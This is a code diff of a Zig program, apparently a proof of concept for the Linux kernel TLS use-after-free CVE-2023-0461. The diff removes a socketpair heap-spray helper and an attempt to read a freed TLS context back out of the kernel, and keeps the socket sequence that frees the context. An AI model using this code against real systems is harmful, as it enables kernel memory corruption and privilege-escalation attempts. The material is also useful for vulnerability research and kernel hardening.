@@ -83,64 +83,6 @@ fn retry_connect(sock: os.socket_t, sock_addr: *const os.sockaddr, len: os.sockl
     return last_err;
 }
 
-const SockSpray = struct {
-    const Self = @This();
-    const NUM_SKS = 8;
-    const NUM_SKBUFFS = 128;
-
-    sks: [4][2]l.fd_t,
-
-    fn init() !Self {
-        var self: Self = undefined;
-
-        for (&self.sks) |*pair| {
-            const ret = errno(l.socketpair(l.AF.UNIX, l.SOCK.STREAM, 0, pair));
-
-            if (ret != .SUCCESS) {
-                log.err("socketpair = {}", .{ret});
-                return error.socketpairFailed;
-            }
-
-            errdefer os.closeSocket(pair[0]);
-            errdefer os.closeSocket(pair[1]);
-        }
-
-        return self;
-    }
-
-    fn deinit(self: Self) void {
-        for (self.sks) |pair| {
-            os.closeSocket(pair[0]);
-            os.closeSocket(pair[1]);
-        }
-    }
-
-    fn spray(self: Self, out: []const u8) !void {
-        var n: u16 = 0;
-
-        for (self.sks) |pair| {
-            while (n < NUM_SKBUFFS) : (n += 1) {
-                _ = try os.write(pair[0], out);
-            }
-        }
-    }
-
-    fn read(self: Self, out: []const u8, in: []u8) !void {
-        var n: u16 = 0;
-
-        for (self.sks) |pair| {
-            while (n < NUM_SKBUFFS) : (n += 1) {
-                _ = try os.read(pair[1], in);
-
-                if (!mem.eql(u8, out, in))
-                    return;
-            }
-        }
-
-        return error.noSkbuffOverwritten;
-    }
-};
-
 const Direction = enum(u32) {
     TX = TLS.TX,
     RX = TLS.RX,
@@ -175,8 +117,6 @@ fn cve_2023_0461() !void {
     const target_addr_p: *const l.sockaddr = @ptrCast(&target_addr.sa);
     const unspec_addr = l.sockaddr{ .family = l.AF.UNSPEC, .data = undefined };
     const addr_sz = @sizeOf(@TypeOf(server_addr.sa));
-    const sks = try SockSpray.init();
-    defer sks.deinit();
 
     const child_pid = try os.fork();
 
@@ -216,7 +156,7 @@ fn cve_2023_0461() !void {
 
     try retry_connect(target_sk, server_addr_p, addr_sz);
     try os.setsockopt(target_sk, SOL.TCP, l.TCP.ULP, "tls");
-    //try setTLSOpt(target_sk, .TX);
+
     try os.connect(target_sk, &unspec_addr, @sizeOf(@TypeOf(unspec_addr)));
     try os.bind(target_sk, target_addr_p, addr_sz);
 
@@ -227,28 +167,6 @@ fn cve_2023_0461() !void {
     const client_sk = try os.accept(target_sk, null, null, 0);
     log.info("parent: free the context", .{});
     os.closeSocket(client_sk);
-
-    const out: [192]u8 = .{ 'n', 'o', 'p', 'e' } ** 48;
-    var in: [192]u8 = .{0x00} ** 192;
-    {
-        try sks.spray(&out);
-        //try setTLSOpt(target_sk, .RX);
-
-        sks.read(&out, &in) catch |err| blk: {
-            if (err == error.noSkbuffOverwritten)
-                break :blk;
-
-            return err;
-        };
-
-        log.info("Read TLS context from kernel?: {s}", .{out[180..192]});
-    }
-
-    log.info("parent: Accept another client", .{});
-    const client_sk2 = try os.accept(target_sk, null, null, 0);
-
-    log.info("What happens on write?", .{});
-    _ = try os.write(client_sk2, &out);
 
     log.info("Goodbye!", .{});
 }
